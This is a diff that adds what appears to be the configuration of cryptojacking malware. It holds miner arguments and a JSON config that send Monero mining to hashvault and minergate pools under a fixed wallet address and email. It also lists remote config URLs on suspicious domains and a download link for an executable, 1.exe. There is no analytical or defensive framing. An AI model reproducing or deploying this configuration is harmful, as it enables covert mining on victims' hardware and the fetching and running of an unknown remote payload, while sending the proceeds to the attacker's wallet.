@@ -1,0 +1,5 @@
+-o pool.monero.hashvault.pro:3333 -u 4AxCKwyvuXqFf5yowLaoWLer2Vywy2zw48fErUDFiSXECVYVXNHfd7DMnAP5e3FaLfafKAjjP4SYfQKvjkEtgKTi1VFcDdM -p ellow:ebash.0@yandex.com -v 0 -k -t %CORES% --cpu-priority 0 --donate-level=1
+{"algo": "cryptonight","background": false,"colors": true,"donate-level": 1,"log-file": null,"print-time": 60,"retries": 5,"retry-pause": 5,"syslog": false,"threads": [{"index": 0,"threads": 32,"blocks": 15,"bfactor": 6,"bsleep": 0}],"pools": [{"url": "pool.monero.hashvault.pro:3333","user": "4AxCKwyvuXqFf5yowLaoWLer2Vywy2zw48fErUDFiSXECVYVXNHfd7DMnAP5e3FaLfafKAjjP4SYfQKvjkEtgKTi1VFcDdM","pass": "NVIDIA:ebash.0@yandex.com","keepalive": true,"nicehash": false}]}
+-o xmr.pool.minergate.com:45560 -u ebash.0@yandex.com -p x -k -B --donate-level=1
+http://shnider.cf/config.txt`http://ebash0.ddns.net/config.txt`http://instavision.pp.ua/config.txt
+0|http://shnider.cf/1.exe
